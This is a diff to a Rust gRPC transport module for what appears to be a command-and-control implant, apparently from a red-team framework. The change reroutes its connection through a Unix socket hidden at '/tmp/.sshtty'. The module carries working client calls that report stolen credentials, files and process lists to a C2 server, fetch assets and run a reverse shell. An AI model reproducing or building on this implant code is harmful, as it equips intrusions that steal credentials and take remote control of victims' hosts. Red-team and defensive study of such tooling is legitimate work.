@@ -1,15 +1,19 @@
+// lib/transport/src/grpc.rs
+
 use crate::Transport;
-use anyhow::Result;
-use hyper::Uri;
+use anyhow::{anyhow, Result};
 use pb::c2::*;
-use std::str::FromStr;
-use std::sync::mpsc::{Receiver, Sender};
+use std::sync::mpsc::{self, Receiver, Sender};
 use tonic::codec::ProstCodec;
 use tonic::GrpcMethod;
+use tonic::IntoRequest;
 use tonic::Request;
 
-use std::time::Duration;
-
+#[cfg(unix)]
+use tokio::net::UnixStream;
+use tonic::transport::{Channel, Endpoint, Uri};
+use tower::service_fn;
+use tokio::time::{sleep, Duration};
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
@@ -23,33 +27,100 @@ pub struct GRPC {
     grpc: tonic::client::Grpc<tonic::transport::Channel>,
 }
 
+// For non-Unix platforms, panic or provide a no-op implementation
+#[cfg(not(unix))]
+impl Transport for GRPC {
+    fn new(_callback: String, _proxy_uri: Option<String>) -> Result<Self> {
+        panic!("The UDS example only works on Unix systems!");
+    }
+
+    // Implement the rest as panics
+    async fn claim_tasks(&mut self, _request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn fetch_asset(
+        &mut self,
+        _request: FetchAssetRequest,
+        _tx: Sender<FetchAssetResponse>,
+    ) -> Result<()> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn report_credential(
+        &mut self,
+        _request: ReportCredentialRequest,
+    ) -> Result<ReportCredentialResponse> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn report_file(
+        &mut self,
+        _request: Receiver<ReportFileRequest>,
+    ) -> Result<ReportFileResponse> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn report_process_list(
+        &mut self,
+        _request: ReportProcessListRequest,
+    ) -> Result<ReportProcessListResponse> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn report_task_output(
+        &mut self,
+        _request: ReportTaskOutputRequest,
+    ) -> Result<ReportTaskOutputResponse> {
+        panic!("Not supported on non-Unix systems.")
+    }
+    async fn reverse_shell(
+        &mut self,
+        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
+        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
+    ) -> Result<()> {
+        panic!("Not supported on non-Unix systems.")
+    }
+}
+
+// On Unix, we connect over a UDS defined at /tmp/.sshtty
+#[cfg(unix)]
+
 impl Transport for GRPC {
     fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
-        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
+        let (sender, receiver) = mpsc::channel();
 
-        let mut http = hyper::client::HttpConnector::new();
-        http.enforce_http(false);
-        http.set_nodelay(true);
+        let handle = std::thread::spawn(move || {
+            let rt = tokio::runtime::Runtime::new().expect("Failed to create Tokio Runtime");
 
-        let channel = match proxy_uri {
-            Some(proxy_uri_string) => {
-                let proxy: hyper_proxy::Proxy = hyper_proxy::Proxy::new(
-                    hyper_proxy::Intercept::All,
-                    Uri::from_str(proxy_uri_string.as_str())?,
-                );
-                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+            let connection: Result<tonic::client::Grpc<Channel>, anyhow::Error> = rt.block_on(async {
+                let endpoint = Endpoint::try_from("http://127.0.0.1:50051/grpc")
+                    .map_err(|e| anyhow!("Invalid endpoint URI: {}", e))?;
 
-                endpoint
-                    .rate_limit(1, Duration::from_millis(25))
-                    .connect_with_connector_lazy(proxy_connector)
-            }
-            None => endpoint
-                .rate_limit(1, Duration::from_millis(25))
-                .connect_lazy(),
-        };
+                let channel = endpoint
+                    .connect_with_connector(service_fn(|_: Uri| async {
+                        let path = "/tmp/.sshtty"; // Replace with the actual UDS path
+                        UnixStream::connect(path)
+                            .await
+                            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
+                    }))
+                    .await
+                    .map_err(|e| anyhow!("Failed to connect to gRPC server: {}", e))?;
 
-        let grpc = tonic::client::Grpc::new(channel);
+                Ok(tonic::client::Grpc::new(channel))
+            });
+
+            sender
+                .send(connection)
+                .expect("Failed to send gRPC connection result");
+
+            // Keep the runtime alive
+            rt.block_on(async {
+                sleep(Duration::from_secs(20)).await;            });
+        });
+
+        let grpc = receiver
+            .recv()
+            .map_err(|e| anyhow!("Failed to receive gRPC connection result: {e}"))??;
+
+        // Optionally, detach the thread if you don't need to join it later
+
+
         Ok(Self { grpc })
     }
 
@@ -73,29 +144,18 @@ impl Transport for GRPC {
                 let msg = match stream.message().await {
                     Ok(maybe_msg) => match maybe_msg {
                         Some(msg) => msg,
-                        None => {
-                            break;
-                        }
+                        None => break,
                     },
                     Err(_err) => {
                         #[cfg(debug_assertions)]
                         log::error!("failed to download file: {}: {}", filename, _err);
-
                         return;
                     }
                 };
-                match tx.send(msg) {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!(
-                            "failed to send downloaded file chunk: {}: {}",
-                            filename,
-                            _err
-                        );
-
-                        return;
-                    }
+                if let Err(_err) = tx.send(msg) {
+                    #[cfg(debug_assertions)]
+                    log::error!("failed to send downloaded file chunk: {}: {}", filename, _err);
+                    return;
                 }
             }
         });
@@ -155,18 +215,13 @@ impl Transport for GRPC {
                 Err(_err) => {
                     #[cfg(debug_assertions)]
                     log::error!("failed to receive gRPC stream response: {}", _err);
-
                     None
                 }
             } {
-                match tx.send(msg).await {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to queue pty input: {}", _err);
-
-                        return;
-                    }
+                if let Err(_err) = tx.send(msg).await {
+                    #[cfg(debug_assertions)]
+                    log::error!("failed to queue pty input: {}", _err);
+                    return;
                 }
             }
         });
@@ -183,13 +238,9 @@ impl GRPC {
         request: impl tonic::IntoRequest<ClaimTasksRequest>,
     ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
-        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> = ProstCodec::default();
 
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
         let mut req = request.into_request();
@@ -200,27 +251,15 @@ impl GRPC {
 
     ///
     /// Download a file from the server, returning one or more chunks of data.
-    /// The maximum size of these chunks is determined by the server.
-    /// The server should reply with two headers:
-    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
-    ///   - "file-size": The number of bytes contained by the file.
-    ///
-    /// If no associated file can be found, a NotFound status error is returned.
     pub async fn fetch_asset_impl(
         &mut self,
         request: impl tonic::IntoRequest<FetchAssetRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
-        tonic::Status,
-    > {
+    ) -> std::result::Result<tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>, tonic::Status>
+    {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
-        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> = ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -235,13 +274,10 @@ impl GRPC {
         request: impl tonic::IntoRequest<ReportCredentialRequest>,
     ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
         let codec: ProstCodec<ReportCredentialRequest, ReportCredentialResponse> =
-            tonic::codec::ProstCodec::default();
+            ProstCodec::default();
 
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
         let mut req = request.into_request();
@@ -252,23 +288,14 @@ impl GRPC {
 
     ///
     /// Report a file from the host to the server.
-    /// Providing content of the file is optional. If content is provided:
-    ///   - Hash will automatically be calculated and the provided hash will be ignored.
-    ///   - Size will automatically be calculated and the provided size will be ignored.
-    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
-    /// Any existing files at the provided path for the host are replaced.
     pub async fn report_file_impl(
         &mut self,
         request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
     ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
-        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> = ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
@@ -277,20 +304,16 @@ impl GRPC {
     }
 
     ///
-    /// Report the active list of running processes. This list will replace any previously reported
-    /// lists for the same host.
+    /// Report the active list of running processes.
     pub async fn report_process_list_impl(
         &mut self,
-        request: impl tonic::IntoRequest<ReportProcessListRequest>,
+        request: ReportProcessListRequest,
     ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
         let codec: ProstCodec<ReportProcessListRequest, ReportProcessListResponse> =
-            tonic::codec::ProstCodec::default();
+            ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -302,16 +325,13 @@ impl GRPC {
     /// Report execution output for a task.
     pub async fn report_task_output_impl(
         &mut self,
-        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
+        request: ReportTaskOutputRequest,
     ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
         let codec: ProstCodec<ReportTaskOutputRequest, ReportTaskOutputResponse> =
-            tonic::codec::ProstCodec::default();
+            ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -322,18 +342,13 @@ impl GRPC {
     async fn reverse_shell_impl(
         &mut self,
         request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
-        tonic::Status,
-    > {
+    ) -> std::result::Result<tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>, tonic::Status>
+    {
         self.grpc.ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
+            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
         })?;
         let codec: ProstCodec<ReverseShellRequest, ReverseShellResponse> =
-            tonic::codec::ProstCodec::default();
+            ProstCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
